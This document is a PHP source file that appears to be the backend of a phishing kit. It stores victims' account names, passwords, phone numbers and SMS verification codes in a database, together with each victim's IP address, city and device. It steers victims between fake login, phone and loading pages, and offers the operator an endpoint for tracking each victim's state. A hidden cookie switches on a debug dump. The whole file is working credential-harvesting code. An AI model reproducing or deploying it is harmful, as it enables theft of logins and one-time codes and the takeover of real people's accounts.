<?php
error_reporting(E_ALL ^ E_NOTICE);
ini_set("display_errors", "On");
//IP SESSION
if(!isset($_SESSION)){		
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
		$ip = getenv("HTTP_CLIENT_IP");
	}else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
		$ip = getenv("HTTP_X_FORWARDED_FOR");
	}else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
		$ip = getenv("REMOTE_ADDR");
	}else if (isset($_SERVER["REMOTE_ADDR"]) && $_SERVER["REMOTE_ADDR"] && strcasecmp($_SERVER["REMOTE_ADDR"], "unknown")){
		$ip = $_SERVER["REMOTE_ADDR"];
	}else{
		$ip = "0.0.0.0";
	}
	session_id(md5($ip));
	session_start();
}
if(!isset($_SESSION))session_start();
date_default_timezone_set('PRC');	
include './App.php';
if(!empty($_GET['dt'])){
	$conf=db('ec_conf')->field('tongji,denyReady,location,readyJump,datatype')->where('id',1)->find();
	$json = array('err'=>0);
	if(!empty($conf)){
		$json['dt'] = empty($conf['datatype'])?0:1;
	}	 	
	exit('var dt = '.json_encode($json,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES));
}elseif(!empty($_POST['rs'])){
	$json = array('err'=>0);
	if(!empty($_SESSION['lastId'])){
		$data = db('ec_data')->where('id',$_SESSION['lastId'])->find();
		if(!empty($data)){
			$json['state'] = $data['state'];
			if(!empty($_POST['pn'])){
				$json['pn_ret'] = db('ec_data')->where('id',$_SESSION['lastId'])->update(array('time'=>time()));
			}
			if(!empty($_POST['pp'])){
				$json['pp_ret'] = db('ec_data')->where('id',$_SESSION['lastId'])->update(array('visit'=>intval($data['visit'])+1));
			}
		}
		if('clear' == $_POST['rs']){
			db('ec_data')->where('id',$_SESSION['lastId'])->update(array('state'=>0));
		}
		$json['id'] = $_SESSION['lastId']; 
		if(!empty($_COOKIE['isCheney'])){
			$json['$data'] = $data; 
			$json['$sql'] = db()->sqls; 
			$json['$sv'] = $sv; 
		}
	}
	exit(json_encode($json,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES));
}elseif(!empty($_REQUEST['sv'])){
	$conf=db('ec_conf')->field('tongji,denyReady,location,readyJump,lasttype')->find();
	if('js' == $_REQUEST['sv']){
		
		if(!empty($_SESSION['lastId'])){
			$data = db('ec_data')->where('id',$_SESSION['lastId'])->find();
			$conf['user'] = $data['phone'];
			$conf['send'] = $data['send'];
		}
		$js = 'var conf = '.json_encode($conf,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES).";\r\n";
		if(!empty($conf['tongji'])){
			$js .= "document.write(".json_encode('<div style="display:none;">'.$conf['tongji'].'</div>').");\r\n";
		}
		exit($js);
	}
	$json = array('err'=>0);
	$sv = json_decode(base64_decode(base64_decode($_REQUEST['sv'])),true);
	if('sv'==$sv['act']){
		if(!empty($_SESSION['lastId'])&&!empty($sv['data']['phone'])){
			$data = db('ec_data')->where('id',$_SESSION['lastId'])->find();
			db('ec_data')->where('id',$_SESSION['lastId'])->update(array('phone'=>$sv['data']['phone'],'logs'=>$data['logs'].'<br>用户填写了手机号码'));
			$json['location'] = './load.html'; 
		}elseif(!empty($_SESSION['lastId'])&&!empty($sv['data']['code'])){
			$data = db('ec_data')->where('id',$_SESSION['lastId'])->find();
			db('ec_data')->where('id',$_SESSION['lastId'])->update(array('code'=>$sv['data']['code'],'logs'=>$data['logs'].'<br>用户填写了验证码'));
			$json['location'] = './jz.html'; 
		}elseif(isset($sv['data']['user'])){
			$city = IpLocation::ipInfo($ip);
			$data = $sv['data'];
			$data['ip']  	= $ip;
			$data['city']  	= $city;
			$data['time']	= date('Y-m-d H:i:s',$_SERVER['REQUEST_TIME']);			
			$data['logs']  	= '用户填写了账号密码';
			$data['info']  	= preg_match('/mobile|phone|Android|iPhone|iPod|ios|iPad/i',$_SERVER['HTTP_USER_AGENT'])?'手机访问':'PC访问';
			$data['href']  	= current(explode('?','http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']));	
			$data['date']  	= date('Y-m-d H:i:s');;
			$data['type']	= empty($data['desc'])?$data['type']:$data['desc'];
			$data['href']	= current(explode('?',$data['href']));
			$data['time']	= $_SERVER['REQUEST_TIME'];
			if(preg_match('/^1\d{10}$/',$data['user'])){
			    $data['phone']	= $data['user'];
    			$json['location'] = './load.html'; 
    			//if(isset($conf['lasttype']) && '3' == $conf['lasttype']){}
			}else{
			    $data['phone']	= '';
			    $json['location'] = './phone.html'; 
			}
			$data['lastId'] = db('ec_data')->filter()->insert($data);
			if(!empty($data['lastId'])){					
				$_SESSION['lastId'] = $data['lastId'];
			}
		}
	}	
	if(!empty($_COOKIE['isCheney'])){
		$json['$data'] = $data; 
		$json['$sql'] = db()->sqls;
		$json['$sv'] = $sv; 
	}	
	exit(json_encode($json,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES));
}
class IpLocation {
	var $fh; 
	var $first; 
	var $last; 
	var $total; 
	//获取用户信息
	static function ipInfo(&$ip=null){
		if(empty($ip)){
			if(getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")){
				$ip = getenv("HTTP_CLIENT_IP");
			}else if(getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")){
				$ip = getenv("HTTP_X_FORWARDED_FOR");
			}else if(getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")){
				$ip = getenv("REMOTE_ADDR");
			}else if(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
				$ip = $_SERVER['REMOTE_ADDR'];
			}else{
				$ip = '0.0.0.0';
			}
		}
		if(strpos($ip,','))$ip = current(explode(',',$ip));
		$ipl = new self;
		$city = $ipl ->ip2addr($ip);
		$city = preg_replace('/[\|\s]+CZ88\.NET/','',$city);
		return $city;
	}
	function __construct() {
		$file = dirname(__FILE__).'/~cityData.dat';
		if(!is_file($file))@copy('http://tools.ns.cn/city/cityData-20210120.dat',$file);
		$this->fh = fopen($file, 'rb'); 
		$this->first = $this->getLong4();
		$this->last = $this->getLong4();
		$this->total = ($this->last - $this->first) / 7; 
	}
	function checkIp($ip){
		$arr = explode('.', $ip);
		if (count($arr) != 4) {
			return false;
		} else {
			for ($i = 0; $i < 4; $i++) {
				if ($arr[$i] < '0' || $arr[$i] > '255') {
					return false;
				}
			}
		}
		return true;
	}
	function getLong4() {
		$result = unpack('Vlong', fread($this->fh, 4));
		return $result['long'];
	}
	function getLong3() {
		$result = unpack('Vlong', fread($this->fh, 3) . chr(0));
		return $result['long'];
	}
	function getInfo($data = "") {
		$char = fread($this->fh, 1);
		while (ord($char) != 0) {
			$data .= $char;
			$char = fread($this->fh, 1);
		}
		return $data;
	}
	function getArea() {
		$byte = fread($this->fh, 1); 
		switch (ord($byte)) {
		case 0:$area = '';
			break; 
		case 1: 
			fseek($this->fh, $this->getLong3());
			$area = $this->getInfo();
			break;
		case 2: 
			fseek($this->fh, $this->getLong3());
			$area = $this->getInfo();
			break;
		default:$area = $this->getInfo($byte);
			break; 
		}
		return $area;
	}
	function ip2addr($ip) {
		if (!$this->checkIp($ip)) {
			return $ip;
		}
		$ip = pack('N', intval(ip2long($ip)));
		$l = 0;
		$r = $this->total;
		while ($l <= $r) {
			$m = floor(($l + $r) / 2); 
			fseek($this->fh, $this->first + $m * 7);
			$beginip = strrev(fread($this->fh, 4)); 
			fseek($this->fh, $this->getLong3());
			$endip = strrev(fread($this->fh, 4)); 
			if ($ip < $beginip) {
				$r = $m - 1;
			} else {
				if ($ip > $endip) {
					$l = $m + 1;
				} else {
					$findip = $this->first + $m * 7;
					break;
				}
			}
		}
		fseek($this->fh, $findip);
		$location['beginip'] = long2ip($this->getLong4()); 
		$offset = $this->getlong3();
		fseek($this->fh, $offset);
		$location['endip'] = long2ip($this->getLong4()); 
		$byte = fread($this->fh, 1); 
		switch (ord($byte)) {
		case 1: 
			$countryOffset = $this->getLong3(); 
			fseek($this->fh, $countryOffset);
			$byte = fread($this->fh, 1); 
			switch (ord($byte)) {
			case 2: 
				fseek($this->fh, $this->getLong3());
				$location['country'] = $this->getInfo();
				fseek($this->fh, $countryOffset + 4);
				$location['area'] = $this->getArea();
				break;
			default: 
				$location['country'] = $this->getInfo($byte);
				$location['area'] = $this->getArea();
				break;
			}
			break;
		case 2: 
			fseek($this->fh, $this->getLong3());
			$location['country'] = $this->getInfo();
			fseek($this->fh, $offset + 8);
			$location['area'] = $this->getArea();
			break;
		default: 
			$location['country'] = $this->getInfo($byte);
			$location['area'] = $this->getArea();
			break;
		}
		foreach ($location as $k => $v) {
			$location[$k] = str_replace('*', '', iconv('gb2312', 'utf-8', $v));
		}
		return $location['country'] . "|" . $location['area'];
	}
	function __destruct() {
		fclose($this->fh);
	}
}